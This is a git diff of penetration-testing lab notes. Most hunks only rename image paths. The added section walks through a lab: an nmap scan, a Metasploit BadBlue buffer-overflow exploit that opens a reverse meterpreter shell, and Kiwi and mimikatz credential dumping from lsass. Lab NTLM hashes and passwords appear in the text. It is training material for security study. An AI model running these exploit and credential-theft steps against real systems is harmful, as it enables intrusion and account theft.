@@ -10,33 +10,33 @@
 
 * On the Attacker machine check the current user
 
-<figure><img src="../../../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Exploitation
 
 * From the Kali machine, generate a `meterpreter` x64 payload
 
-<figure><img src="../../../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 * Set up a web server to host the payload
 
-<figure><img src="../../../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 * Download the payload file on the target system using the `certutil` tool in `cmd`
 
-<figure><img src="../../../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
 
 * Stop the http server and start `msfconsole` on the Kali machine
 * Execute the `payload.exe` on the Win target system and check the reverse shell on Kali
 
-<figure><img src="../../../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
 
 * Manually search for the **`unattend.xml`** file, it should be inside
   * `C:\\Windows\\Panther`
 
-<figure><img src="../../../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>
 
 * In a new terminal tab
 
@@ -44,7 +44,7 @@
 cat unattend.xml
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Get Access
 
@@ -53,7 +53,7 @@ cat unattend.xml
 * Save it to a new file
 * Decode it using the `base64` tool
 
-<figure><img src="../../../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>
 
 * Test the `administrator`:`Admin@123root` credentials with the `psexec` tool
 
@@ -61,11 +61,11 @@ cat unattend.xml
 psexec.py administrator@10.0.17.233
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### [Powersploit](https://github.com/PowerShellMafia/PowerSploit)
 
-<figure><img src="../../../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>
 
 * Run the `powerup.ps1` Powershell script to find privilege escalation vulnerability on target machine powershell.
 
@@ -74,7 +74,7 @@ cd .\Desktop\PowerSploit\Privesc\
 ls
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>
 
 * Import `PowerUp.ps1` script and Invoke-PrivescAudit function.
 
@@ -84,7 +84,7 @@ powershell -ep bypass (PowerShell execution policy bypass)
 Invoke-PrivescAudit
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (15) (1).png" alt=""><figcaption></figcaption></figure>
 
 * Cat out the file
 * Decoding administrator password using Powershell.
@@ -96,7 +96,7 @@ ssword))
 echo $password
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (16) (1).png" alt=""><figcaption></figcaption></figure>
 
 * Run a command prompt as an administrator user using discover credentials.
 
@@ -106,7 +106,7 @@ Admin@123
 whoami
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (17) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -136,7 +136,183 @@ cat flag.txt
 Flag: `097ab83639dce0ab3429cb0349493f60`
 {% endhint %}
 
+***
 
+## Lab 2 - Kiwi + Mimikatz
+
+> 🔬 [Windows: Meterpreter: Kiwi Extension](https://attackdefense.com/challengedetails?cid=2340)
+>
+> * Target IP: `10.0.17.5`
+> * Dumping passwords hashes with **mimikatz**
+> * Both Kali Machine and Attacker/Victim Windows machine are provided
+
+### Enumeration
+
+```bash
+nmap 10.0.17.5
+```
+
+```bash
+Starting Nmap 7.91 ( https://nmap.org ) at 2024-07-07 21:32 IST
+Nmap scan report for 10.0.17.5
+Host is up (0.0020s latency).
+Not shown: 995 closed ports
+PORT     STATE SERVICE
+80/tcp   open  http
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+3389/tcp open  ms-wbt-server
+
+Nmap done: 1 IP address (1 host up) scanned in 5.65 seconds
+```
+
+```bash
+nmap -sV -p80 10.0.17.5
+```
+
+```bash
+PORT   STATE SERVICE VERSION
+80/tcp open  http    BadBlue httpd 2.7
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+```
+
+<figure><img src="../../../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+### Exploitation
+
+```bash
+msfconsole -q
+msf6 > search badblue
+```
+
+```bash
+Matching Modules
+================
+
+   #  Name                                       Disclosure Date  Rank   Check  Description
+   -  ----                                       ---------------  ----   -----  -----------
+   0  exploit/windows/http/badblue_ext_overflow  2003-04-20       great  Yes    BadBlue 2.5 EXT.dll Buffer Overflow
+   1  exploit/windows/http/badblue_passthru      2007-12-10       great  No     BadBlue 2.72b PassThru Buffer Overflow
+
+
+Interact with a module by name or index. For example info 1, use 1 or use exploit/windows/http/badblue_passthru
+```
+
+```bash
+msf6 > use exploit/windows/http/badblue_passthru
+msf6 exploit(windows/http/badblue_passthru) > set RHOSTS 10.0.17.5
+msf6 exploit(windows/http/badblue_passthru) > exploit
+```
+
+```bash
+[*] Started reverse TCP handler on 10.10.16.3:4444 
+[*] Trying target BadBlue EE 2.7 Universal...
+[*] Sending stage (175174 bytes) to 10.0.17.5
+[*] Meterpreter session 1 opened (10.10.16.3:4444 -> 10.0.17.5:49595) at 2024-07-07 21:38:36 +0530
+
+meterpreter > 
+```
+
+### Privilege Escalation <a href="#privilege-escalation" id="privilege-escalation"></a>
+
+```bash
+meterpreter > sysinfo
+meterpreter > getuid
+meterpreter > migrate -N lsass.exe
+```
+
+<figure><img src="../../../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+### Hash Dumping - Kiwi <a href="#hash-dumping-kiwi" id="hash-dumping-kiwi"></a>
+
+```bash
+load kiwi
+?
+```
+
+<figure><img src="../../../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+
+* Retrieve all credentials
+
+```bash
+meterpreter > creds_all
+```
+
+<figure><img src="../../../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+
+{% hint style="success" %}
+Administrator User NTLM Hash: `e3c61a68f1b89ee6c8ba9507378dc88d`
+{% endhint %}
+
+* Dump LSA SAM (NTLM hashes for all users)
+
+```bash
+meterpreter > lsa_dump_sam
+```
+
+<figure><img src="../../../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+
+{% hint style="success" %}
+Student User NTLM Hash: `bd4ca1fbe028f3c5066467a7f6a73b0b`
+{% endhint %}
+
+* Dump LSA secrets. This could provide with clear-text passwords
+
+```bash
+meterpreter > lsa_dump_secrets 
+```
+
+<figure><img src="../../../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+
+{% hint style="success" %}
+Syskey: `377af0de68bdc918d22c57a263d38326`
+{% endhint %}
+
+### Hash Dumping - Mimikatz
+
+```bash
+meterpreter > cd C:\\
+meterpreter > mkdir Temp
+meterpreter > cd Temp
+meterpreter > upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
+meterpreter > shell
+```
+
+<figure><img src="../../../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+
+* Run `mimikatz.exe`
+
+<figure><img src="../../../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+
+* Dump the cache of the `lsass` process
+
+```bash
+mimikatz # lsadump::sam
+```
+
+<figure><img src="../../../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
+
+```bash
+mimikatz # lsadump::secrets
+```
+
+<figure><img src="../../../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
+
+* Display logon passwords, when stored in clear-text
+  * in this case clear-text password are disabled - `(null)`
+
+```bash
+mimikatz # sekurlsa::logonPasswords
+```
+
+<figure><img src="../../../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
 
 
 
